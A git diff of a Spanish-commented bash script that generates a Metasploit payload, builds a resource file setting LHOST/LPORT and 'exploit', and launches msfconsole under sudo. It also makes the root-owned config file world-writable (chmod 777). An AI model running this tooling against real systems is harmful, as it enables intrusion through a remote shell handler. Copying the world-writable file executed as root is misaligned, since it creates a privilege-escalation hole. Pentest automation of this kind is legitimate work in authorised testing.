@@ -1,8 +1,12 @@
 #!/bin/bash
 
+# Generamos el payload de Metasploit
+bash ./utilities/payload.sh
+
+
 # Función para mostrar el uso del script
 usage() {
-    echo "Uso: $0 [-ip <IP_ADDRESS>]"
+    echo "Uso: $0 [-ip <IP_ADDRESS>] [-port <PORT>]"
     exit 1
 }
 
@@ -13,8 +17,8 @@ PORT=""
 # Procesar argumentos de línea de comandos
 while [[ "$#" -gt 0 ]]; do
     case $1 in
-        -ip) LOCAL_IP="$2"; shift ;;
-        -port) PORT="$2"; shift ;;
+        -i|--ip) LOCAL_IP="$2"; shift ;;
+        -p|--port) PORT="$2"; shift ;;
         -h|--help) usage ;;
         *) usage ;;
     esac
@@ -54,5 +58,9 @@ set LPORT $PORT
 exploit
 EOL
 
+# Cambiar los permisos del archivo config.rc
+sudo chown root:root config.rc
+sudo chmod 777 config.rc
+
 # Ejecutar Metasploit con el archivo config.rc
-msfconsole -r config.rc
+sudo msfconsole -r config.rc
